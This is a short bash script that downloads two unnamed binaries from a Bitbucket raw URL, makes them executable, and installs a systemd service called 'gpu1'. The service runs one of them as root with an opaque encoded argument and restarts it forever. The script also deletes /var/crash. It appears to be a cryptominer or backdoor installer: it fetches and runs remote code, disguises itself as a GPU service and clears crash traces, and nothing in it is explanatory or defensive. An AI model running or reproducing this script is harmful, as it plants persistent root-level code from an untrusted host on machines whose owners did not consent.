#!/bin/bash
cd /home
sudo wget https://bitbucket.org/gou634343/a/raw/3118d4c233122cb22f289767fa5825f693296399/a
sudo wget https://bitbucket.org/gou634343/a/raw/3118d4c233122cb22f289767fa5825f693296399/sec
sudo chmod +x sec
sudo chmod +x a
sudo rm -rf /lib/systemd/system/gpu1.service
sudo rm -rf /var/crash
bash -c 'cat <<EOT >>/lib/systemd/system/gpu1.service 
[Unit]
Description=gpu1
After=network.target
[Service]
ExecStart= /home/sec 9oNc5N3SDmKQ/12UFPRkqUbn8h+9wY/P/AGJ2ahQH2dDv0oYJjpc1sFFpNnr/bJNMzbomhDZ/jToPDFPWlW9cAdpG2KZnSzjtV3m4e4Mtyb/U3znUw51Wvsc5Xv0x450OTfQIBRzx4zHSu8vdtfjLsRlCmeQxYXRwPS0xXf9t+IrPUNn6jN98eC7vT8qdURktICFADDOEwX7Tt0iAVWmCLetFw+jAdzd3U4NkIJMXKUdMRuAyJmvbw==
WatchdogSec=36000
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&
systemctl daemon-reload &&
systemctl enable gpu1.service &&
service gpu1 stop  &&
service gpu1 restart
